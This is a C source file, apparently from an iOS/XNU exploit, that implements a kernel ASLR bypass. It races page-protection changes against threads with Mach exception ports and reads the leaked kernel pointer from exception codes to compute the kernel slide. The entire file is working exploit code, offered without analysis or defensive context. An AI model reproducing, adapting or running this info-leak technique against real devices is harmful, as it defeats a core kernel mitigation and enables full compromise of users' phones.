#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <mach/mach.h>

#include "common.h"
#include "infoleak.h"

#define NUMTH 2

void crashme(void);
__asm__(
    ".text\n"
    ".globl _crashme\n"
    ".align 14\n"
    "_crashme:\n"
    "    .word 0xdeadbeef\n"
    ".align 14"
);

void clear_cache(uintptr_t start, uintptr_t end, uintptr_t __unused, uintptr_t type);
__asm__(
    ".text\n"
    ".globl _clear_cache\n"
    "_clear_cache:\n"
#ifdef __LP64__
    "    movz x16, 0x8000, lsl 16\n"
    "    svc 0x80\n"
    "    ret"
#else
    "    bx lr"
#endif
);

static volatile kptr_t kslide = 0;

static void* catcher(void *arg)
{
    mach_port_t port = *(mach_port_t*)arg;
    task_t self = mach_task_self();
    while(1)
    {
        // TODO: 32bit
#pragma pack(4)
        typedef struct
        {
            mach_msg_header_t head;
            mach_msg_body_t body;
            mach_msg_port_descriptor_t thread;
            mach_msg_port_descriptor_t task;
            NDR_record_t NDR;
            exception_type_t exception;
            mach_msg_type_number_t codeCnt;
            integer_t code[2];
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
            mach_msg_trailer_t trailer;
        } Request;
        typedef struct {
            mach_msg_header_t head;
            NDR_record_t NDR;
            kern_return_t RetCode;
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
        } Reply;
#pragma pack()
        Request req;
        kern_return_t ret = mach_msg(&req.head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, (mach_msg_size_t)sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_msg_receive: %s", mach_error_string(ret));
            break;
        }

        mach_port_deallocate(self, req.thread.name);
        mach_port_deallocate(self, req.task.name);

        if(!kslide && req.code[0] == 1 && req.code[1] != 0xdeadbeef)
        {
            uint32_t val = req.code[1];
            LOG("Leaked value: 0x%x", val);
            if((val & 0xfffff) == (OFF_ANCHOR & 0xfffff)) // XXX 0xfffffff0070d4878
            {
                kslide = val - OFF_ANCHOR;
            }
        }

        Reply rep;
        rep.head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req.head.msgh_bits), 0);
        rep.head.msgh_remote_port = req.head.msgh_remote_port;
        rep.head.msgh_size = (mach_msg_size_t)sizeof(rep);
        rep.head.msgh_local_port = MACH_PORT_NULL;
        rep.head.msgh_id = req.head.msgh_id + 100;
        rep.head.msgh_reserved = 0;
        rep.NDR = NDR_record;
        rep.RetCode = KERN_SUCCESS;
        rep.flavor = req.flavor;
        rep.stateCnt = req.stateCnt;
        rep.state = req.state;
        if(kslide)
        {
            rep.state.__pc = (uint64_t)&pthread_exit;
            rep.state.__x[0] = 0;
        }
        ret = mach_msg(&rep.head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(rep), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_msg_send: %s", mach_error_string(ret));
        }
    }
    return NULL;
}

static void* crasher(void *arg)
{
    mach_port_t port = *(mach_port_t*)arg;
    ASSERT_RET(out, "thread_set_exception_ports", thread_set_exception_ports(mach_thread_self(), EXC_MASK_ALL, port, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE64)); // TODO: 32bit
    crashme();
out:;
    return NULL;
}

kptr_t get_kernel_slide(void)
{
    if(!kslide)
    {
        task_t self = mach_task_self();
        thread_t selfth = mach_thread_self();
        mach_port_t port = mach_reply_port();
        thread_act_array_t threads = NULL;
        mach_msg_type_number_t tnum = 0;

        ASSERT_PORT(out, "mach_reply_port", port);
        ASSERT_RET(out, "mach_port_insert_right", mach_port_insert_right(self, port, port, MACH_MSG_TYPE_MAKE_SEND));

        ASSERT_RET(out, "task_threads", task_threads(self, &threads, &tnum));
        LOG("Got %u thread ports", tnum);
        if(!threads || !tnum) goto out;
        for(size_t i = 0; i < tnum; ++i)
        {
            thread_t t = threads[i];
            if(t != selfth)
            {
                thread_suspend(t);
            }
        }

        pthread_t cth;
        pthread_create(&cth, NULL, &catcher, &port);

        pthread_t th[NUMTH];
        for(size_t i = 0; i < NUMTH; ++i)
        {
            pthread_create(&th[i], NULL, &crasher, &port);
        }
        mach_vm_address_t addr = (mach_vm_address_t)&crashme;
        sig_t old = signal(SIGSEGV, SIG_IGN);
        while(!kslide)
        {
            clear_cache(addr, addr + 4, 0, 0);
            mach_vm_protect(self, addr, 0x4000, 0, VM_PROT_NONE);
            mach_vm_protect(self, addr, 0x4000, 0, VM_PROT_READ | VM_PROT_EXECUTE);
        }
        LOG("kslide: " ADDR, kslide);
        signal(SIGSEGV, old);
        for(size_t i = 0; i < NUMTH; ++i)
        {
            pthread_join(th[i], NULL);
        }
        mach_port_destroy(self, port);
        port = MACH_PORT_NULL;
        pthread_join(cth, NULL);
    out:;
        if(MACH_PORT_VALID(port))
        {
            mach_port_destroy(self, port);
        }
        if(threads)
        {
            for(size_t i = 0; i < tnum; ++i)
            {
                thread_t t = threads[i];
                if(t != selfth)
                {
                    thread_resume(t);
                }
                mach_port_deallocate(self, t);
            }
            mach_vm_deallocate(self, (mach_vm_address_t)threads, tnum * sizeof(thread_t));
        }
    }
    return kslide;
}
